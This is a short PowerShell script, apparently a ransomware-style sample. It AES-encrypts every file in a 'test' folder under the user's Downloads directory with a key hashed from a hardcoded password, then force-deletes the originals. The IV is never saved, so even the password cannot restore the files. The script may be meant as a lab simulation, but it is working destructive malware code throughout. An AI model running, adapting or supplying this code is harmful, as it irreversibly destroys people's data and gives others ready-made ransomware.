# Define encryption details
$password = "pass1234"
$key = (New-Object System.Security.Cryptography.SHA256Managed).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($password))
#$downloadsPath = [environment]::GetFolderPath("%userprofile%") + "\Downloads\test"
$downloadsPath = (New-Object -ComObject Shell.Application).Namespace('shell:Downloads').Self.Path + "\test"

function Encrypt-File {
    param (
        [string]$inputFilePath,
        [byte[]]$key
    )

    # Create an AES encryptor
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $aes.IV = $aes.IV # Default IV

    # Prepare file streams
    $outputFilePath = "$inputFilePath.encrypted"
    $inputStream = [System.IO.File]::OpenRead($inputFilePath)
    $outputStream = [System.IO.File]::Create($outputFilePath)
    $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($outputStream, $aes.CreateEncryptor(), [System.Security.Cryptography.CryptoStreamMode]::Write)

    # Encrypt the file
    $buffer = New-Object byte[](4096)
    while (($read = $inputStream.Read($buffer, 0, $buffer.Length)) -gt 0) {
        $cryptoStream.Write($buffer, 0, $read)
    }

    # Close streams
    $cryptoStream.Close()
    $inputStream.Close()
    $outputStream.Close()
	
    # Remove the original file
    Remove-Item -Path $inputFilePath -Force

    Write-Host "Encrypted and removed $inputFilePath"
}

# Iterate through each file in the folder and encrypt
Get-ChildItem -Path $downloadsPath -File | ForEach-Object {
    Encrypt-File -inputFilePath $_.FullName -key $key
}

Write-Host "All files in $downloadsPath have been encrypted."
